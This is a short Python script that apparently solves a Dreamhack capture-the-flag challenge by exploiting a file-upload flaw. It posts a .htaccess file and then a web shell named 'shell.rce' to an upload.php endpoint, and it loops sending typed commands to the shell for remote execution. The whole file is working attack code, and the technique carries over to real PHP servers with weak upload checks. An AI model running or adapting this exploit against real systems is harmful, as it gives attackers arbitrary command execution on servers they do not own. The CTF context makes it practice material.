import requests
from bs4 import BeautifulSoup


if __name__ == "__main__":
    url = "http://host3.dreamhack.games:23048"
    with open(".htaccess") as f:
        req = requests.post(url+'/upload.php', files={'file':f})
        print(BeautifulSoup(req.content, 'html.parser').prettify())
        with open("shell.rce") as shell:
            req = requests.post(url+'/upload.php', files={'file':shell})
            print(BeautifulSoup(req.content, 'html.parser').prettify())
            while True:
                cmd = input("cmd: ") # cd / && ./flag
                req = requests.get(url+'/upload/shell.rce', {'cmd':cmd})
                print(BeautifulSoup(req.content, 'html.parser').pre)